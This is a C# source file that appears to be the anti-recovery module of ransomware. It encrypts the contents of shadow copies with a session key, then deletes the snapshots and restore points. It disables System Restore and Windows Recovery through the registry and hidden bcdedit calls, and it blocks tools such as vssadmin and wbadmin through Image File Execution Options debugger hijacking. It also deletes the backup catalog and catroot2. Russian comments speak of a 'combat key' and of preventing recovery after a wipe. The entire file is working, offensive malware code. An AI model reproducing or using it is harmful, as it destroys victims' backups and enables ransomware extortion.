using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Management;
using System.Runtime.InteropServices;
using Microsoft.Win32;

namespace ns0
{
    internal static class VssKiller
    {
        private const string IfeoPath = @"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options";
        private static readonly string[] BlockedTools = new string[]
        {
            "vssadmin.exe", "wbadmin.exe", "bcdedit.exe",
            "wevtutil.exe", "wmic.exe", "recimg.exe",
            "diskshadow.exe", "sdclt.exe", "msconfig.exe"
        };

        public static void Execute(byte[] sessionKey, bool encryptCopies = true)
        {
            if (sessionKey == null || sessionKey.Length != 32) return;
            try { DeleteRestorePoints(); } catch { }
            // P3.10: EncryptShadowCopies только при боевом ключе. При dummy-ключе
            // (new byte[32] из GForm2) шифрование нулями дало бы невосстановимый мусор
            // без единого преимущества — чистим копии без перекрытия.
            if (encryptCopies)
            {
                try { EncryptShadowCopies(sessionKey); } catch { }
            }
            try { DeleteAllSnapshots(); } catch { }
            try { BlockRecoveryTools(); } catch { }
            try { DisableWinRE(); } catch { }
            try { DeleteBackupCatalog(); } catch { }
        }
        private static void EncryptShadowCopies(byte[] sessionKey)
        {
            var snapshots = ListShadowCopies();
            foreach (var snap in snapshots)
            {
                try
                {
                    string device = snap.DeviceObject;
                    if (string.IsNullOrEmpty(device)) continue;

                    string root = device.TrimEnd('\\') + "\\";
                    EncryptTree(root, sessionKey);
                }
                catch { }
            }
        }

        private static void EncryptTree(string root, byte[] sessionKey)
        {
            var stack = new Stack<string>();
            stack.Push(root);
            int guard = 0;

            while (stack.Count > 0 && guard++ < 500000)
            {
                string dir = stack.Pop();
                try
                {
                    foreach (var f in Directory.GetFiles(dir, "*.*", SearchOption.TopDirectoryOnly))
                    {
                        try
                        {
                            string ext = Path.GetExtension(f).ToLower();
                            if (ext == ".dvdcrpt") continue;
                            var fi = new FileInfo(f);
                            if (fi.Length == 0 || fi.Length >= 750L * 1024 * 1024) continue;
                            HybridCrypto.EncryptFileAesGcm(f, sessionKey);
                        }
                        catch { }
                    }
                    foreach (var d in Directory.GetDirectories(dir, "*", SearchOption.TopDirectoryOnly))
                        stack.Push(d);
                }
                catch { }
            }
        }
        private struct SnapInfo
        {
            public string Id;
            public string DeviceObject;
        }

        private static List<SnapInfo> ListShadowCopies()
        {
            var result = new List<SnapInfo>();
            try
            {
                using (var searcher = new ManagementObjectSearcher("SELECT * FROM Win32_ShadowCopy"))
                using (var col = searcher.Get())
                {
                    foreach (ManagementObject mo in col)
                    {
                        try
                        {
                            var info = new SnapInfo
                            {
                                Id = mo["ID"] as string,
                                DeviceObject = mo["DeviceObject"] as string
                            };
                            result.Add(info);
                            mo.Dispose();
                        }
                        catch { }
                    }
                }
            }
            catch { }
            return result;
        }

        private static void DeleteAllSnapshots()
        {
            try
            {
                using (var searcher = new ManagementObjectSearcher("SELECT * FROM Win32_ShadowCopy"))
                using (var col = searcher.Get())
                {
                    var victims = new List<ManagementObject>();
                    foreach (ManagementObject mo in col) victims.Add(mo);
                    foreach (var mo in victims)
                    {
                        try
                        {
                            mo.InvokeMethod("Delete", null);
                        }
                        catch { }
                        finally { try { mo.Dispose(); } catch { } }
                    }
                }
            }
            catch { }
        }

        private static void DeleteRestorePoints()
        {
            try
            {
                using (var searcher = new ManagementObjectSearcher(
                    "SELECT * FROM SystemRestore"))
                using (var col = searcher.Get())
                {
                    var victims = new List<ManagementObject>();
                    foreach (ManagementObject mo in col) victims.Add(mo);
                    foreach (var mo in victims)
                    {
                        try { mo.InvokeMethod("Delete", null); }
                        catch { }
                        finally { try { mo.Dispose(); } catch { } }
                    }
                }
            }
            catch { }
        }
        private static void DisableWinRE()
        {
            try
            {
                using (var key = Registry.LocalMachine.CreateSubKey(
                    @"SOFTWARE\Microsoft\Windows NT\CurrentVersion\SystemRestore"))
                {
                    key.SetValue("DisableSR", 1, RegistryValueKind.DWord);
                    key.SetValue("RPSessionInterval", 0, RegistryValueKind.DWord);
                }
            }
            catch { }
            try
            {
                using (var key = Registry.LocalMachine.CreateSubKey(
                    @"SOFTWARE\Policies\Microsoft\Windows NT\SystemRestore"))
                {
                    key.SetValue("DisableSR", 1, RegistryValueKind.DWord);
                }
            }
            catch { }
            try
            {
                using (var key = Registry.LocalMachine.OpenSubKey(
                    @"SOFTWARE\Microsoft\Windows NT\CurrentVersion\WinRE", true))
                {
                    if (key != null)
                    {
                        key.SetValue("WinREPath", "", RegistryValueKind.String);
                        key.SetValue("WinREStaged", 0, RegistryValueKind.DWord);
                    }
                }
            }
            catch { }
            try
            {
                var psi = new ProcessStartInfo
                {
                    FileName = "bcdedit.exe",
                    Arguments = "/set {default} recoveryenabled No",
                    UseShellExecute = false,
                    CreateNoWindow = true,
                    WindowStyle = ProcessWindowStyle.Hidden
                };
                Process.Start(psi)?.WaitForExit(8000);
            }
            catch { }
            try
            {
                var psi = new ProcessStartInfo
                {
                    FileName = "bcdedit.exe",
                    Arguments = "/set {default} bootstatuspolicy ignoreallfailures",
                    UseShellExecute = false,
                    CreateNoWindow = true,
                    WindowStyle = ProcessWindowStyle.Hidden
                };
                Process.Start(psi)?.WaitForExit(8000);
            }
            catch { }
        }
        private static void BlockRecoveryTools()
        {
            foreach (string tool in BlockedTools)
            {
                try
                {
                    using (var key = Registry.LocalMachine.CreateSubKey(IfeoPath + "\\" + tool))
                    {
                        key.SetValue("Debugger", @"C:\Windows\System32\systray.exe", RegistryValueKind.String);
                        key.SetValue("UseFilter", 1, RegistryValueKind.DWord);
                    }
                }
                catch { }
            }
        }

        public static void UnblockRecoveryTools()
        {
            foreach (string tool in BlockedTools)
            {
                try
                {
                    using (var key = Registry.LocalMachine.OpenSubKey(IfeoPath, true))
                    {
                        if (key != null) key.DeleteSubKeyTree(tool, false);
                    }
                }
                catch { }
            }
        }
        private static void DeleteBackupCatalog()
        {
            try
            {
                string wbcat = Environment.ExpandEnvironmentVariables(
                    @"%SystemDrive%\WindowsImageBackup");
                if (Directory.Exists(wbcat))
                {
                    try { Directory.Delete(wbcat, true); } catch { }
                }
            }
            catch { }
            // P3.11: catroot2 — осторожно, может сломать подписанные драйверы.
            // Чистим только если реально нужно (после вайпа систему не восстановят).
            try
            {
                string catroot2 = Environment.ExpandEnvironmentVariables(
                    @"%SystemRoot%\System32\catroot2");
                if (Directory.Exists(catroot2))
                {
                    try
                    {
                        foreach (var f in Directory.GetFiles(catroot2, "*.*", SearchOption.AllDirectories))
                            File.Delete(f);
                        foreach (var d in Directory.GetDirectories(catroot2, "*", SearchOption.AllDirectories))
                            Directory.Delete(d, true);
                    }
                    catch { }
                }
            }
            catch { }
        }
    }
}